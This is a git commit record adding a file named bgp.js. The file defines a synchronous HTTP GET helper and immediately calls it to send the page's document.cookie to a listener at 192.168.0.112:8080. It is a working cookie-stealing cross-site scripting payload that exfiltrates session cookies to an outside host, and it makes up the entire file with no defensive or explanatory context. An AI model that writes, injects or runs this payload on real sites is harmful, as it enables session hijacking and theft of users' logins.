76bec6fc8700d98e3cded22425484de40923d68d
SxNade <73271976+SxNade@users.noreply.github.com>
2020-12-21 10:02:08 -0500

    Add files via upload

---
+++ bgp.js
@@ -0,0 +1,9 @@
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+
+httpGet('http://192.168.0.112:8080/['+document.cookie)
